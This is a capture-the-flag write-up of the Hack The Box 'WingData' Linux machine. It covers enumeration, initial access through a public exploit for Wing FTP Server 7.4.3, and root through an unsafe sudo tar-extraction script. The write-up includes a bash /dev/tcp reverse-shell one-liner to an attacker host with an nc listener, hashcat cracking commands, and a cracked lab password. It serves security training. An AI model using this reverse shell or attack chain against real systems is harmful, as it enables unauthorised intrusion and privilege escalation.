WingData (Easy Linux Machine) – Write-Up
Overview

This write-up documents the full exploitation process of the WingData machine, focusing on enumeration, initial access via a vulnerable FTP service, and privilege escalation through insecure backup handling.

Platform: Hack The Box
Difficulty: Easy
OS: Linux
Techniques Used:
Service enumeration
Vulnerability identification (Wing FTP Server)
Reverse shell exploitation
Password cracking with Hashcat
Privilege escalation via insecure tar extraction
1. Initial Enumeration

First, verify connectivity to the target:

ping <target_ip>
Nmap Scan
nmap -sC -sV -oN nmap_results.txt <target_ip>

Results:

Port 22 – SSH
Port 80 – HTTP
2. Web Enumeration

Navigating to the web server reveals a redirect to:

http://wingdata.htb
Add to /etc/hosts
<target_ip> wingdata.htb

Exploring the site further, clicking Client Portal reveals another subdomain:

ftp.wingdata.htb

Add this as well:

<target_ip> ftp.wingdata.htb
3. Vulnerability Identification

The FTP portal reveals:

Wing FTP Server v7.4.3

This version is known to be vulnerable. Searching for exploits leads to a public PoC on GitHub.

4. Initial Access (Reverse Shell)
Setup Listener
nc -lvnp 4444
Run Exploit

Using the Python PoC, execute a reverse shell payload:

python3 exploit.py

Payload example:

bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'

Once executed, a reverse shell is established.

Stabilize Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
5. Post-Exploitation Enumeration

Navigating the filesystem reveals restricted access to user directories. However, an XML file containing a password hash is discovered.

Extract the hash and save it locally.

6. Password Cracking

Using Hashcat:

hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt

Cracked Credentials:

Username: wacky
Password: !#7Blushing^*Bride5
7. SSH Access
ssh wacky@<target_ip>

Login is successful.

Capture User Flag

Navigate to the user directory and retrieve the flag.

8. Privilege Escalation
Check Sudo Permissions
sudo -l

Result shows the user can run:

restore_backups_clients.py
9. Vulnerability Analysis

The script contains:

with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
Key Issue:
tar.extractall() runs as root
No proper validation of archive contents
Vulnerable to path traversal / symlink attacks
10. Exploitation (Privilege Escalation)
Steps:
Create a malicious tar archive containing files that overwrite sensitive locations
Place the archive in the expected backup directory
Execute the restore script with sudo
sudo python3 restore_backups_clients.py

Because extraction runs as root, this results in privilege escalation.

11. Root Access

After exploitation:

whoami
root
Capture Root Flag

Navigate to:

/root

Retrieve the final flag.

Key Takeaways
Always enumerate subdomains and redirects
Public exploits can provide quick initial access, but understanding them is critical
Weak backup/restore mechanisms are a common privilege escalation vector
Misuse of tar.extractall() can lead to full system compromise
Skills Demonstrated
Network scanning & enumeration
Web and service analysis
Exploit research and execution
Reverse shell handling
Password cracking (Hashcat)
Linux privilege escalation
Final Thoughts

This machine highlights how small misconfigurations—like insecure archive extraction—can lead to full compromise. Even “easy” boxes reinforce real-world attack paths used in misconfigured production systems.
